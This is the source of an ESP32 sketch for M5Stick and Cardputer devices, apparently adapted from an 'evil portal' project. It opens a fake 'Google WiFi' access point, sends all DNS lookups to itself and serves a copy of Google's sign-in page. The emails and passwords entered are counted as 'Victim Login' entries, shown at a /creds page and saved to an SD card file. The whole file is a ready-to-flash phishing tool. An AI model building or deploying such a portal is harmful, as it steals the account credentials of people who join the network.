// Based on https://github.com/n0xa/M5Stick-Stuph/blob/main/CaptPort/CaptPort.ino

#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>

// #define M5STICKCPLUS
#define M5CARDPUTER

#if defined(M5STICKCPLUS) && defined(M5CARDPUTER)
#error "Please define only one platform: M5STICKCPLUS or M5CARDPUTER"
#endif

#if defined(M5STICKCPLUS)
#define DISPLAY M5.Lcd
#define SPEAKER M5.Beep
#define HAS_LED 10  // Number is equivalent to GPIO
#define GPIO_LED 10
// #define HAS_SDCARD
#define SD_CLK_PIN 0
#define SD_MISO_PIN 36  //25
#define SD_MOSI_PIN 26
// #define SD_CS_PIN
#endif

#if defined(M5CARDPUTER)
#define DISPLAY M5Cardputer.Display
#define SPEAKER M5Cardputer.Speaker
#define KB M5Cardputer.Keyboard
#define HAS_SDCARD
#define SD_CLK_PIN 40
#define SD_MISO_PIN 39
#define SD_MOSI_PIN 14
#define SD_CS_PIN 12
#endif

#if defined(HAS_SDCARD)
#include <FS.h>
#include <SD.h>
#include <SPI.h>
#endif

#if defined(M5STICKCPLUS)
#include <M5StickCPlus.h>
#elif defined(M5CARDPUTER)
#include <M5Cardputer.h>
#endif

#define DEFAULT_AP_SSID_NAME "Google WiFi"
#define SD_CREDS_PATH "/evil-portal-creds.txt"
// #define LANGUAGE_EN_US
#define LANGUAGE_PT_BR

#if defined(LANGUAGE_EN_US) && defined(LANGUAGE_PT_BR)
#error "Please define only one language: LANGUAGE_EN_US or LANGUAGE_PT_BR"
#endif

#if defined(LANGUAGE_EN_US)
#define LOGIN_TITLE "Sign in"
#define LOGIN_SUBTITLE "Use your Google Account"
#define LOGIN_EMAIL_PLACEHOLDER "Email"
#define LOGIN_PASSWORD_PLACEHOLDER "Password"
#define LOGIN_MESSAGE "Please log in to browse securely."
#define LOGIN_BUTTON "Next"
#define LOGIN_AFTER_MESSAGE "Please wait a few minutes. Soon you will be able to access the internet."
#elif defined(LANGUAGE_PT_BR)
#define LOGIN_TITLE "Fazer login"
#define LOGIN_SUBTITLE "Use sua Conta do Google"
#define LOGIN_EMAIL_PLACEHOLDER "E-mail"
#define LOGIN_PASSWORD_PLACEHOLDER "Senha"
#define LOGIN_MESSAGE "Por favor, faça login para navegar de forma segura."
#define LOGIN_BUTTON "Avançar"
#define LOGIN_AFTER_MESSAGE "Por favor, aguarde alguns minutos. Em breve você poderá acessar a internet."
#endif

int totalCapturedCredentials = 0;
int previousTotalCapturedCredentials = -1;  // stupid hack but wtfe
String capturedCredentialsHtml = "";
bool sdcardMounted = false;
String apSsidName = String(DEFAULT_AP_SSID_NAME);

#if defined(HAS_SDCARD)
SPIClass* sdcardSPI = NULL;
SemaphoreHandle_t sdcardSemaphore;
#endif

// Init System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress AP_GATEWAY(172, 0, 0, 1);  // Gateway
unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
WebServer webServer(80);

void setup() {
  setupDeviceSettings();
  setupWiFi();
  setupWebServer();
  setupSdCard();

  bootTime = lastActivity = millis();
}

void setupDeviceSettings() {
  Serial.begin(115200);
  while (!Serial && millis() < 1000)
    ;

#if defined(M5STICKCPLUS)
  M5.begin();
  DISPLAY.setRotation(3);
#elif defined(M5CARDPUTER)
  M5Cardputer.begin();
  DISPLAY.setRotation(1);
#endif

#if defined(HAS_LED)
  pinMode(GPIO_LED, OUTPUT);
  digitalWrite(GPIO_LED, HIGH);
#endif

  DISPLAY.fillScreen(BLACK);
  DISPLAY.setSwapBytes(true);
  DISPLAY.setTextSize(2);
}

bool setupSdCard() {
#if defined(HAS_SDCARD)
  sdcardSemaphore = xSemaphoreCreateMutex();
  sdcardSPI = new SPIClass(FSPI);
  sdcardSPI->begin(SD_CLK_PIN, SD_MISO_PIN, SD_MOSI_PIN, SD_CS_PIN);

  delay(10);

  if (!SD.begin(SD_CS_PIN, *sdcardSPI)) {
    Serial.println("Failed to mount SDCARD");
    return false;
  } else {
    Serial.println("SDCARD mounted successfully");
    sdcardMounted = true;
    return true;
  }
#endif
}

void setupWiFi() {
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(AP_GATEWAY, AP_GATEWAY, IPAddress(255, 255, 255, 0));
  WiFi.softAP(apSsidName);
}

void setupWebServer() {
  dnsServer.start(DNS_PORT, "*", AP_GATEWAY);  // DNS spoofing (Only HTTP)

  webServer.on("/post", []() {
    totalCapturedCredentials = totalCapturedCredentials + 1;

    webServer.send(HTTP_CODE, "text/html", index_POST());

#if defined(M5STICKCPLUS)
    SPEAKER.tone(4000);
#elif defined(M5CARDPUTER)
      SPEAKER.tone(4000, 50);
#endif

    DISPLAY.print("Victim Login");

    delay(50);

#if defined(M5STICKCPLUS)
    SPEAKER.mute();
#endif

    DISPLAY.fillScreen(BLACK);

#if defined(HAS_LED)
    blinkLed();
#endif
  });

  webServer.on("/creds", []() {
    webServer.send(HTTP_CODE, "text/html", creds_GET());
  });

  webServer.on("/clear", []() {
    webServer.send(HTTP_CODE, "text/html", clear_GET());
  });

  webServer.onNotFound([]() {
    lastActivity = millis();
    webServer.send(HTTP_CODE, "text/html", index_GET());
  });

  webServer.begin();
}

void loop() {
  if ((millis() - lastTick) > TICK_TIMER) {

    lastTick = millis();

    if (totalCapturedCredentials != previousTotalCapturedCredentials) {
      previousTotalCapturedCredentials = totalCapturedCredentials;

      printHomeToScreen();
    }
  }

  dnsServer.processNextRequest();
  webServer.handleClient();
}

void printHomeToScreen() {
  DISPLAY.fillScreen(BLACK);
  DISPLAY.setSwapBytes(true);
  DISPLAY.setTextSize(2);
  DISPLAY.setTextColor(TFT_RED, TFT_BLACK);
  DISPLAY.setCursor(0, 10);
  DISPLAY.print("EVIL PORTAL");
  DISPLAY.setTextColor(TFT_GREEN, TFT_BLACK);
  DISPLAY.setCursor(0, 35);
  DISPLAY.print("WiFi IP: ");
  DISPLAY.println(AP_GATEWAY);
  DISPLAY.printf("SSID: ");  //, apSsidName);
  DISPLAY.print(apSsidName);
  DISPLAY.println("");
  DISPLAY.printf("Victim Count: %d\n", totalCapturedCredentials);
}

String getInputValue(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String getHtmlContents(String body) {
  String html =
    "<!DOCTYPE html>"
    "<html>"
    "<head>"
    "  <title>"
    + apSsidName + "</title>"
                   "  <meta charset='UTF-8'>"
                   "  <meta name='viewport' content='width=device-width, initial-scale=1.0'>"
                   "  <style>a:hover{ text-decoration: underline;} body{ font-family: Arial, sans-serif; align-items: center; justify-content: center; background-color: #FFFFFF;} input[type='text'], input[type='password']{ width: 100%; padding: 12px 10px; margin: 8px 0; box-sizing: border-box; border: 1px solid #cccccc; border-radius: 4px;} .container{ margin: auto; padding: 20px;} .logo-container{ text-align: center; margin-bottom: 30px; display: flex; justify-content: center; align-items: center;} .logo{ width: 40px; height: 40px; fill: #FFC72C; margin-right: 100px;} .company-name{ font-size: 42px; color: black; margin-left: 0px;} .form-container{ background: #FFFFFF; border: 1px solid #CEC0DE; border-radius: 4px; padding: 20px; box-shadow: 0px 0px 10px 0px rgba(108, 66, 156, 0.2);} h1{ text-align: center; font-size: 28px; font-weight: 500; margin-bottom: 20px;} .input-field{ width: 100%; padding: 12px; border: 1px solid #BEABD3; border-radius: 4px; margin-bottom: 20px; font-size: 14px;} .submit-btn{ background: #1a73e8; color: white; border: none; padding: 12px 20px; border-radius: 4px; font-size: 16px;} .submit-btn:hover{ background: #5B3784;} .containerlogo{ padding-top: 25px;} .containertitle{ color: #202124; font-size: 24px; padding: 15px 0px 10px 0px;} .containersubtitle{ color: #202124; font-size: 16px; padding: 0px 0px 30px 0px;} .containermsg{ padding: 30px 0px 0px 0px; color: #5f6368;} .containerbtn{ padding: 30px 0px 25px 0px;} @media screen and (min-width: 768px){ .logo{ max-width: 80px; max-height: 80px;}} </style>"
                   "</head>"
                   "<body>"
                   "  <div class='container'>"
                   "    <div class='logo-container'>"
                   "      <?xml version='1.0' standalone='no'?>"
                   "      <!DOCTYPE svg PUBLIC '-//W3C//DTD SVG 20010904//EN' 'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'>"
                   "    </div>"
                   "    <div class=form-container>"
                   "      <center>"
                   "        <div class='containerlogo'><svg viewBox='0 0 75 24' width='75' height='24' xmlns='http://www.w3.org/2000/svg' aria-hidden='true' class='BFr46e xduoyf'><g id='qaEJec'><path fill='#ea4335' d='M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z'></path></g><g id='YGlOvc'><path fill='#34a853' d='M58.193.67h2.564v17.44h-2.564z'></path></g><g id='BWfIk'><path fill='#4285f4' d='M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z'></path></g><g id='e6m3fd'><path fill='#fbbc05' d='M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z'></path></g><g id='vbkDmc'><path fill='#ea4335' d='M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z'></path></g><g id='idEJde'><path fill='#4285f4' d='M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z'></path></g></svg></div>"
                   "      </center>"
                   "      <div style='min-height: 150px'>"
    + body + "      </div>"
             "    </div>"
             "  </div>"
             "</body>"
             "</html>";
  return html;
}

String creds_GET() {
  return getHtmlContents("<ol>" + capturedCredentialsHtml + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>");
}

String index_GET() {
  String loginTitle = String(LOGIN_TITLE);
  String loginSubTitle = String(LOGIN_SUBTITLE);
  String loginEmailPlaceholder = String(LOGIN_EMAIL_PLACEHOLDER);
  String loginPasswordPlaceholder = String(LOGIN_PASSWORD_PLACEHOLDER);
  String loginMessage = String(LOGIN_MESSAGE);
  String loginButton = String(LOGIN_BUTTON);

  return getHtmlContents("<center><div class='containertitle'>" + loginTitle + " </div><div class='containersubtitle'>" + loginSubTitle + " </div></center><form action='/post' id='login-form'><input name='email' class='input-field' type='text' placeholder='" + loginEmailPlaceholder + "' required><input name='password' class='input-field' type='password' placeholder='" + loginPasswordPlaceholder + "' required /><div class='containermsg'>" + loginMessage + "</div><div class='containerbtn'><button id=submitbtn class=submit-btn type=submit>" + loginButton + " </button></div></form>");
}

String index_POST() {
  String email = getInputValue("email");
  String password = getInputValue("password");
  capturedCredentialsHtml = "<li>Email: <b>" + email + "</b></br>Password: <b>" + password + "</b></li>" + capturedCredentialsHtml;

#if defined(HAS_SDCARD)
  appendToFile(SD, SD_CREDS_PATH, String(email + " = " + password).c_str());
#endif

    return getHtmlContents(LOGIN_AFTER_MESSAGE);
}

String clear_GET() {
  String email = "<p></p>";
  String password = "<p></p>";
  capturedCredentialsHtml = "<p></p>";
  totalCapturedCredentials = 0;
  return getHtmlContents("<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/creds>Back to capturedCredentialsHtml</a></center><center><a style=\"color:blue\" href=/>Back to Index</a></center>");
}

#if defined(HAS_LED)

void blinkLed() {
  int count = 0;

  while (count < 5) {
    digitalWrite(GPIO_LED, LOW);
    delay(500);
    digitalWrite(GPIO_LED, HIGH);
    delay(500);
    count = count + 1;
  }
}

#endif

#if defined(HAS_SDCARD)

void appendToFile(fs::FS& fs, const char* path, const char* text) {
  if (xSemaphoreTake(sdcardSemaphore, portMAX_DELAY) == pdTRUE) {
    File file = fs.open(path, FILE_APPEND);

    if (!file) {
      Serial.println("Failed to open file for appending");
      xSemaphoreGive(sdcardSemaphore);
      return;
    }

    Serial.printf("Appending text '%s' to file: %s\n", text, path);

    if (file.println(text)) {
      Serial.println("Text appended");
    } else {
      Serial.println("Append failed");
    }

    file.close();

    xSemaphoreGive(sdcardSemaphore);
  }
}

#endif
